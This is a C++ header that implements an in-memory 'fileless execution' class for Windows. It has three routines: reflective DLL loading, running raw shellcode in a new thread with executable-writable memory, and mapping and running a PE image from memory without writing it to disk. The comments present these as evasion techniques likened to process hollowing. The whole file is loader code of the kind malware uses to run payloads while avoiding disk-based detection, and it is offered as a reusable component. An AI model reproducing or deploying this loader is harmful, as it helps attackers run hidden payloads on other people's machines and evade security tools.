#pragma once

#ifdef _WIN32
#include <Windows.h>
#include <string>
#include <vector>
#include <cstdint>

namespace nuub::domain {

// Execute code entirely in memory without touching disk
class FilelessExec {
public:
    // Reflective DLL loading - load DLL from memory
    static HMODULE reflect_load(const void* dll_data, size_t dll_size) {
        if (!dll_data || dll_size < sizeof(IMAGE_DOS_HEADER)) return nullptr;

        auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(dll_data);
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;

        auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS*>(
            reinterpret_cast<uintptr_t>(dll_data) + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;

        // Allocate memory for DLL
        SIZE_T image_size = nt->OptionalHeader.SizeOfImage;
        LPVOID base = VirtualAlloc(
            reinterpret_cast<LPVOID>(nt->OptionalHeader.ImageBase),
            image_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);

        if (!base) {
            base = VirtualAlloc(nullptr, image_size,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        }

        if (!base) return nullptr;

        // Copy headers
        memcpy(base, dll_data, nt->OptionalHeader.SizeOfHeaders);

        // Copy sections
        auto* section = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
            if (section[i].SizeOfRawData > 0) {
                void* dest = reinterpret_cast<void*>(
                    reinterpret_cast<uintptr_t>(base) + section[i].VirtualAddress);
                const void* src = reinterpret_cast<const void*>(
                    reinterpret_cast<uintptr_t>(dll_data) + section[i].PointerToRawData);
                memcpy(dest, src, section[i].SizeOfRawData);
            }
        }

        // Fix relocations
        ptrdiff_t delta = reinterpret_cast<uintptr_t>(base) - nt->OptionalHeader.ImageBase;
        if (delta != 0) {
            auto* reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>(
                reinterpret_cast<uintptr_t>(base) + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

            while (reloc->VirtualAddress > 0) {
                auto* entries = reinterpret_cast<uint16_t*>(
                    reinterpret_cast<uintptr_t>(reloc) + sizeof(IMAGE_BASE_RELOCATION));
                DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(uint16_t);

                for (DWORD i = 0; i < count; ++i) {
                    int type = entries[i] >> 12;
                    int offset = entries[i] & 0xFFF;
                    void* patch = reinterpret_cast<void*>(
                        reinterpret_cast<uintptr_t>(base) + reloc->VirtualAddress + offset);

                    switch (type) {
                        case IMAGE_REL_BASED_ABSOLUTE:
                            break;
                        case IMAGE_REL_BASED_HIGHLOW:
                            *reinterpret_cast<uint32_t*>(patch) += static_cast<uint32_t>(delta);
                            break;
                        case IMAGE_REL_BASED_DIR64:
                            *reinterpret_cast<uint64_t*>(patch) += delta;
                            break;
                    }
                }
                reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>(
                    reinterpret_cast<uint8_t*>(reloc) + reloc->SizeOfBlock);
            }
        }

        // Call DllMain
        using DllMain = BOOL(WINAPI*)(HMODULE, DWORD, LPVOID);
        auto entry = reinterpret_cast<DllMain>(
            reinterpret_cast<uintptr_t>(base) + nt->OptionalHeader.AddressOfEntryPoint);
        entry(reinterpret_cast<HMODULE>(base), DLL_PROCESS_ATTACH, nullptr);

        return reinterpret_cast<HMODULE>(base);
    }

    // Execute shellcode from memory
    static bool execute_shellcode(const void* shellcode, size_t size) {
        // Allocate executable memory
        LPVOID mem = VirtualAlloc(nullptr, size,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!mem) return false;

        // Copy shellcode
        memcpy(mem, shellcode, size);

        // Execute in new thread
        HANDLE thread = CreateThread(nullptr, 0,
            reinterpret_cast<LPTHREAD_START_ROUTINE>(mem),
            nullptr, 0, nullptr);

        if (!thread) {
            VirtualFree(mem, 0, MEM_RELEASE);
            return false;
        }

        // Don't wait - let it run asynchronously
        CloseHandle(thread);
        return true;
    }

    // Run PE from memory (no file on disk)
    static bool run_pe_from_memory(const void* pe_data, size_t pe_size) {
        if (!pe_data || pe_size < sizeof(IMAGE_DOS_HEADER)) return false;

        auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(pe_data);
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;

        auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS*>(
            reinterpret_cast<uintptr_t>(pe_data) + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) return false;

        SIZE_T image_size = nt->OptionalHeader.SizeOfImage;

        // Allocate memory
        LPVOID base = VirtualAlloc(
            reinterpret_cast<LPVOID>(nt->OptionalHeader.ImageBase),
            image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (!base) {
            base = VirtualAlloc(nullptr, image_size,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        }

        if (!base) return false;

        // Copy headers and sections (similar to process hollowing)
        memcpy(base, pe_data, dos->e_lfanew + sizeof(IMAGE_NT_HEADERS));

        auto* section = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
            if (section[i].SizeOfRawData > 0) {
                void* dest = reinterpret_cast<void*>(
                    reinterpret_cast<uintptr_t>(base) + section[i].VirtualAddress);
                const void* src = reinterpret_cast<const void*>(
                    reinterpret_cast<uintptr_t>(pe_data) + section[i].PointerToRawData);
                memcpy(dest, src, section[i].SizeOfRawData);
            }
        }

        // Execute entry point
        auto entry = reinterpret_cast<void(*)()>(
            reinterpret_cast<uintptr_t>(base) + nt->OptionalHeader.AddressOfEntryPoint);
        entry();

        return true;
    }
};

} // namespace nuub::domain
#endif
